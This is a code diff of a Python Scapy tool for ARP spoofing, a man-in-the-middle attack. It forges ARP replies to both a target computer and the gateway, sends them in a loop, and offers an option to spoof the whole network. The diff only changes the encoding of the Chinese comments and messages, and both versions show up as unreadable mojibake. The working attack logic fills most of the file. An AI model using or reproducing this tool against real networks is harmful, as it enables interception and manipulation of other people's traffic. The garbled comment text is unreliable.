@@ -4,7 +4,7 @@ from scapy.all import *
 import optparse
 import threading
 
-#½â¾öÔÚlinuxÏµÍ³ÉÏÔËĞĞÊ±±¨µÄunicode±àÂëÏà¹Ø´íÎó
+#è§£å†³åœ¨linuxç³»ç»Ÿä¸Šè¿è¡Œæ—¶æŠ¥çš„unicodeç¼–ç ç›¸å…³é”™è¯¯
 import sys
 reload(sys)
 sys.setdefaultencoding('utf-8')
@@ -12,34 +12,34 @@ sys.setdefaultencoding('utf-8')
 
 def getMac(tgtIP):
     '''
-    µ÷ÓÃscapyµÄgetmacbyipº¯Êı£¬»ñÈ¡¹¥»÷Ä¿±êIPµÄMACµØÖ·¡£
+    è°ƒç”¨scapyçš„getmacbyipå‡½æ•°ï¼Œè·å–æ”»å‡»ç›®æ ‡IPçš„MACåœ°å€ã€‚
     '''
     try:
         tgtMac = getmacbyip(tgtIP)
         return tgtMac
     except:
-        print '[-]Çë¼ì²éÄ¿±êIPÊÇ·ñ´æ»î' 
+        print '[-]è¯·æ£€æŸ¥ç›®æ ‡IPæ˜¯å¦å­˜æ´»' 
 
 def createArp2Station(srcMac,tgtMac,gatewayIP,tgtIP):
     '''
-    Éú³ÉARPÊı¾İ°ü£¬Î±ÔìÍø¹ØÆÛÆ­Ä¿±ê¼ÆËã»ú
-    srcMac:±¾»úµÄMACµØÖ·£¬³äµ±ÖĞ¼äÈË
-    tgtMac:Ä¿±ê¼ÆËã»úµÄMAC
-    gatewayIP:Íø¹ØµÄIP£¬½«·¢ÍùÍø¹ØµÄÊı¾İÖ¸Ïò±¾»ú£¨ÖĞ¼äÈË£©£¬ĞÎ³ÉARP¹¥»÷
-    tgtIP:Ä¿±ê¼ÆËã»úµÄIP
-    op=2,±íÊ¾ARPÏìÓ¦
+    ç”ŸæˆARPæ•°æ®åŒ…ï¼Œä¼ªé€ ç½‘å…³æ¬ºéª—ç›®æ ‡è®¡ç®—æœº
+    srcMac:æœ¬æœºçš„MACåœ°å€ï¼Œå……å½“ä¸­é—´äºº
+    tgtMac:ç›®æ ‡è®¡ç®—æœºçš„MAC
+    gatewayIP:ç½‘å…³çš„IPï¼Œå°†å‘å¾€ç½‘å…³çš„æ•°æ®æŒ‡å‘æœ¬æœºï¼ˆä¸­é—´äººï¼‰ï¼Œå½¢æˆARPæ”»å‡»
+    tgtIP:ç›®æ ‡è®¡ç®—æœºçš„IP
+    op=2,è¡¨ç¤ºARPå“åº”
     '''
     pkt = Ether(src=srcMac,dst=tgtMac)/ARP(hwsrc=srcMac,psrc=gatewayIP,hwdst=tgtMac,pdst=tgtIP,op=2)
     return pkt
 
 def createArp2Gateway(srcMac,gatewayMac,tgtIP,gatewayIP):
     '''
-    Éú³ÉARPÊı¾İ°ü£¬Î±ÔìÄ¿±ê¼ÆËã»úÆÛÆ­Íø¹Ø
-    srcMac:±¾»úµÄMACµØÖ·£¬³äµ±ÖĞ¼äÈË
-    gatewayMac:Íø¹ØµÄMAC
-    tgtIP:Ä¿±ê¼ÆËã»úµÄIP£¬½«Íø¹Ø·¢ÍùÄ¿±ê¼ÆËã»úµÄÊı¾İÖ¸Ïò±¾»ú£¨ÖĞ¼äÈË£©£¬ĞÎ³ÉARP¹¥»÷
-    gatewayIP:Íø¹ØµÄIP
-    op=2,±íÊ¾ARPÏìÓ¦
+    ç”ŸæˆARPæ•°æ®åŒ…ï¼Œä¼ªé€ ç›®æ ‡è®¡ç®—æœºæ¬ºéª—ç½‘å…³
+    srcMac:æœ¬æœºçš„MACåœ°å€ï¼Œå……å½“ä¸­é—´äºº
+    gatewayMac:ç½‘å…³çš„MAC
+    tgtIP:ç›®æ ‡è®¡ç®—æœºçš„IPï¼Œå°†ç½‘å…³å‘å¾€ç›®æ ‡è®¡ç®—æœºçš„æ•°æ®æŒ‡å‘æœ¬æœºï¼ˆä¸­é—´äººï¼‰ï¼Œå½¢æˆARPæ”»å‡»
+    gatewayIP:ç½‘å…³çš„IP
+    op=2,è¡¨ç¤ºARPå“åº”
     '''
     pkt = Ether(src=srcMac,dst=gatewayMac)/ARP(hwsrc=srcMac,psrc=tgtIP,hwdst=gatewayMac,pdst=gatewayIP,op=2)
     return pkt
@@ -48,10 +48,10 @@ def createArp2Gateway(srcMac,gatewayMac,tgtIP,gatewayIP):
 def main():
     usage = 'Usage: %prog -t <targetip> -g <gatewayip> -i <interface> -a'
     parser = optparse.OptionParser(usage,version='v1.0')
-    parser.add_option('-t',dest='targetIP',type='string',help='Ö¸¶¨Ä¿±ê¼ÆËã»úIP')
-    parser.add_option('-g',dest='gatewayIP',type='string',help='Ö¸¶¨Íø¹ØIP')
-    parser.add_option('-i',dest='interface',type='string',help='Ö¸¶¨Ê¹ÓÃµÄÍø¿¨')
-    parser.add_option('-a',dest='allarp',action='store_true',help='ÊÇ·ñ½øĞĞÈ«ÍøarpÆÛÆ­')
+    parser.add_option('-t',dest='targetIP',type='string',help='æŒ‡å®šç›®æ ‡è®¡ç®—æœºIP')
+    parser.add_option('-g',dest='gatewayIP',type='string',help='æŒ‡å®šç½‘å…³IP')
+    parser.add_option('-i',dest='interface',type='string',help='æŒ‡å®šä½¿ç”¨çš„ç½‘å¡')
+    parser.add_option('-a',dest='allarp',action='store_true',help='æ˜¯å¦è¿›è¡Œå…¨ç½‘arpæ¬ºéª—')
     
     options,args = parser.parse_args()
     tgtIP = options.targetIP
@@ -63,12 +63,12 @@ def main():
         exit(0)
     
     srcMac = get_if_hwaddr(interface)
-    print '±¾»úMACµØÖ·ÊÇ£º',srcMac
+    print 'æœ¬æœºMACåœ°å€æ˜¯ï¼š',srcMac
     tgtMac = getMac(tgtIP)
-    print 'Ä¿±ê¼ÆËã»úMACµØÖ·ÊÇ£º',tgtMac
+    print 'ç›®æ ‡è®¡ç®—æœºMACåœ°å€æ˜¯ï¼š',tgtMac
     gatewayMac = getMac(gatewayIP)
-    print 'Íø¹ØMACµØÖ·ÊÇ£º',gatewayMac
-    raw_input('°´ÈÎÒâ¼ü¼ÌĞø£º')
+    print 'ç½‘å…³MACåœ°å€æ˜¯ï¼š',gatewayMac
+    raw_input('æŒ‰ä»»æ„é”®ç»§ç»­ï¼š')
 
 
     pktstation = createArp2Station(srcMac,tgtMac,gatewayIP,tgtIP)
@@ -80,12 +80,12 @@ def main():
         t = threading.Thread(target=sendp,args=(pktstation,),kwargs={'iface':interface})
         t.start()
         t.join()
-        print str(i) + ' [*]·¢ËÍÒ»¸ö¼ÆËã»úARPÆÛÆ­°ü'
+        print str(i) + ' [*]å‘é€ä¸€ä¸ªè®¡ç®—æœºARPæ¬ºéª—åŒ…'
        
         s = threading.Thread(target=sendp,args=(pktgateway,),kwargs={'iface':interface,})
         s.start()
         s.join()
-        print str(i) + ' [*]·¢ËÍÒ»¸öÍø¹ØARPÆÛÆ­°ü'
+        print str(i) + ' [*]å‘é€ä¸€ä¸ªç½‘å…³ARPæ¬ºéª—åŒ…'
         i += 1       
         
             
